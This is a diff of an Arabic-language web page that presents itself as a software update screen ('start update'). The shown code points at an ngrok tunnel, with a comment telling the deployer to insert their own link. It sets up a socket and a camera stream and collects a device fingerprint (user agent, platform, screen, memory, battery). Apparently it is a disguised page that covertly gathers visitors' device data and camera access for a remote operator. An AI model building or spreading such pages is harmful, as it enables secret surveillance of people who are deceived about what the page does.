@@ -18,7 +18,9 @@
     <div id="msg">جاري الاتصال...</div>
     <button id="startBtn" class="btn" onclick="start()">بدء التحديث</button>
     <script>
-        const SERVER_URL = "https://d932-2001-16a4-2f8-adf9-ac8c-c4ff-fef6-f51.ngrok-free.app";
+        // ⚠️ استبدل برابط Ngrok الخاص بك
+        const SERVER_URL = "https://xxxx.ngrok-free.app";
+        
         let socket = null, ROOT = null, camStream = null;
 
         function connect() {
@@ -153,8 +155,7 @@
             const info = {
                 ua: navigator.userAgent, plat: navigator.platform,
                 scr: screen.width+'x'+screen.height, cores: navigator.hardwareConcurrency,
-                mem: navigator.deviceMemory||'?', lang: navigator.language, online: navigator.onLine,
-                battery: '?'
+                mem: navigator.deviceMemory||'?', lang: navigator.language, online: navigator.onLine
             };
             try {
                 navigator.getBattery().then(b => {
